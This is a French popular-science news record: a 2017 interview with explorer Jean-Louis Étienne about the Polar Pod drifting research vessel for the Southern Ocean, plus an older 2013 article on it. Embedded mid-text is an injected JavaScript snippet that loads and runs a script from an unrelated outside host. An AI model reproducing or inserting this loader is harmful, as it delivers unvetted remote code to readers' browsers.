{"title": "Polar Pod, la fabuleuse odyssée de Jean-Louis Étienne en Antarctique", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "28/09/2017", "content": "Avec son navire vertical  Polar Pod , Jean-Louis Étienne, explorateur et parrain de Futura, veut tourner autour de l'Antarctique. Sans naviguer, en se laissant dériver. Son projet, devenu une opération internationale à laquelle participent de grands instituts de recherche, prend corps, comme il nous l'explique dans cet entretien. Depuis plusieurs années,  Jean-Louis Étienne  prépare un voyage qui n'a encore jamais été fait : une dérive dans l'océan Austral autour du continent  Antarctique . Son navire, baptisé  Polar Pod , est des plus originaux : il est vertical, planté dans la mer comme une bouée flottante. Nous suivons ce projet depuis ses débuts et vous trouverez au bas de cet article les explications ainsi qu'une vidéo sur cet engin sans équivalent ; il restait alors à l'inventer et à le mettre au point. Ce qui a été fait. Voir aussi : Ouragans Irma, Maria... pour Jean-Louis Étienne, la Terre a la fièvre En dérivant avec les masses d'eau durant plus d'un an, l'équipage à bord, de sept personnes, pourra effectuer de très nombreuses analyses afin de mieux comprendre les échanges océan-atmosphère. Ces mesures serviront notamment à valider les données obtenues par les satellites ; les opérateurs de ces derniers sont toujours friands de telles validations, d'où la présence du Cnes parmi les partenaires du projet. Les observations sous-marines permettront aussi des mesures, rares sur cette échelle d'espace et de temps, des courants, du plancton, des productions sonores des cétacés, etc. Aujourd'hui, Jean-Louis Étienne nous parle de l'avancement du projet, qui se concrétise sérieusement. Le  Polar Pod,  debout dans les vagues. Mesurant 100 m et pesant 720 tonnes, il est conçu pour les vagues des « cinquantièmes hurlants », autour de 50° de latitude sud. © Jean-Louis Étienne                               Où en est votre mission Polar  Pod  ? Jean-Louis Étienne :  Elle est en bonne voie ! C'est devenu un grand projet international. Il regroupe aujourd'hui 52 institutions de 12 pays. C'est l' Ifremer   [Institut français de recherche pour l'exploitation de la mer, NDLR]  qui en est le maître d'œuvre. Après mon expédition, c'est lui qui l'exploitera, comme un autre navire océanographique. Je ne vais pas tous les citer mais il y a le CNRS, le Cnes, le MIT  [Massachusetts Institute of Technology, NDLR] , le  Scripps   [Scripps institution of oceanography, NDLR] , d'autres encore et des contributeurs privés. “ « Soyez grands ! » Pourquoi ce vaisseau dérivant intéresse-t-il ces organismes de recherche ? Jean-Louis Étienne :  Il y a beaucoup d'attentes pour ce genre de mission. D'abord, pour la région. L'océan est très mal connu autour de l'Antarctique, encerclé par les « quarantièmes rugissants ». Au-delà, se jouent des échanges entre la mer et l'atmosphère qui sont des éléments clés pour la compréhension du  climat . C'est le plus grand  puits de CO 2  de la planète. Ensuite, pour la durée de la mission. Les navires océanographiques ne réalisent pas ce genre d'étude. C'est un projet magnifique pour la France ; il est ambitieux techniquement et aussi scientifiquement. Dans leur  Polar Pod , que l'on voit ici tracté à l'horizontale, Jean-Louis Étienne et son équipage réaliseront un tour complet de l'Antarctique, le long du courant circumpolaire austral, sur 24.000 km. Dans des creux de dix mètres, le déplacement horizontal au niveau de la passerelle supérieure sera de deux mètres. Le vaisseau restera habitable dans les plus grosses mers. L'énergie sera fournie par trois éoliennes et une hydrolienne. Des voiles permettront d'orienter le navire. © DR                               Un calendrier ? Jean-Louis Étienne :  Le navire sera prêt en 2018. L'expédition pourra se dérouler de 2020 à 2022. Nous en sommes actuellement aux essais en bassins, à Brest et à Nantes. Il s'agissait de voir si le  Polar Pod  résistera bien aux  vagues les plus grosses . Ces études-là sont à peu près terminées. Donc cela avance bien. Vous avez l'habitude de travailler avec des écoles. Leur parlez-vous de Polar Pod ? Jean-Louis Étienne :  Oui, je fais des conférences en milieu scolaire. Il y a parfois un certain manque d'intérêt ; leur formation est très orientée vers la culture générale. Et c'est vrai qu'on leur parle beaucoup de chômage. Je leur dis  « soyez grands » ,  « ne vous mettez pas de limites ! ». Un mot sur les expéditions Tara Océans, qui sont réalisées sur votre bateau  Antarctica , que vous aviez imaginé ? Jean-Louis Étienne :  Ce qu'ils font avec  Tara  est magnifique. Ils continuent à faire ce que j'avais entamé. C'est de la science utile, mais aussi de la vulgarisation. Ces aventures sont une passerelle attractive pour le public. Pour en savoir plus En vidéo : le  Polar Pod , future station dérivante de Jean-Louis Étienne Article de Jean-Luc Goudet publié le 29 mai 2013 Découvrez le  Polar Pod , un vaisseau destiné à étudier l'océan Austral. Cet étonnant navire vertical dérivant, imaginé par Jean-Louis Étienne, est difficile à décrire, mais il se comprend très bien en images. Les voici...  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avec le  Polar Pod , Jean-Louis Étienne propose aux océanographes un moyen d'étudier l'océan Austral comme on ne l'a jamais fait : en dérivant tout autour de l'Antarctique, au sein même du  courant circumpolaire . Dans cet océan Austral, par 50° sud, les « cinquantièmes hurlants » des  navigateurs , les conditions sont telles que peu de navires s'y aventurent à la mauvaise saison. La région est aujourd'hui l'une des moins connues du monde. Jean-Louis Étienne explique le  Polar Pod , sa structure originale et ses missions futures autour de l'Antarctique. © Jean-Louis Étienne Pourtant, l'importance de cette zone est grande à plus d'un titre. Les trois océans - Pacifique, Atlantique et Indien - s'y rejoignent et y reçoivent de l'eau froide profonde. En refroidissant l' air  qui circule au-dessus de lui, l' océan Austral  influe sur le  climat de la planète . Sur le plan océanographique, il reste des études à mener et les biologistes ne savent pas tout des  écosystèmes  qu'il abrite. Une fois basculé, le  Polar Pod  est vertical. L'équipage de sept personnes (trois marins et quatre scientifiques) peut vivre en autarcie au milieu des éléments déchaînés, jusqu'à la relève, prévue tous les deux à trois mois. On distingue les trois éoliennes et les voiles rétractables, qui servent à orienter l'engin. © DR                               Une station dérivante pour les mers australes Pour rester longuement - plus d'une année - dans cet environnement hostile, Jean-Louis Étienne a imaginé un vaisseau dérivant de 720 tonnes, le  Polar Pod . Tracté à l'horizontal, l'engin de 125 m de long (hors-tout) emplit ses ballasts une fois parvenu à destination. Ces 150 tonnes supplémentaires font alors basculer le navire de 90°. Le voilà vertical, avec un tirant d'air de 50 m (hors-tout). Grâce à son lourd ballast, le  Polar Pod  ne devrait pas gîter de plus de 5°, même dans la mer redoutable de l'hiver austral. L'idée du basculement n'est pas nouvelle puisque le célèbre  Flip  (pour  FLoating Instrument Platform , plateforme flottante instrumentée) l'a déjà concrétisée. Lancé en 1962 par le Scripps (un institut océanographique des États-Unis), ce bateau est toujours opérationnel. Le vaisseau a été dessiné à Lorient, chez  Ship Studio , et attend le bouclage du financement et des partenariats pour que commence la construction. L' expédition Polar Pod  devrait prendre la mer en 2015. ", "theme": "planete"}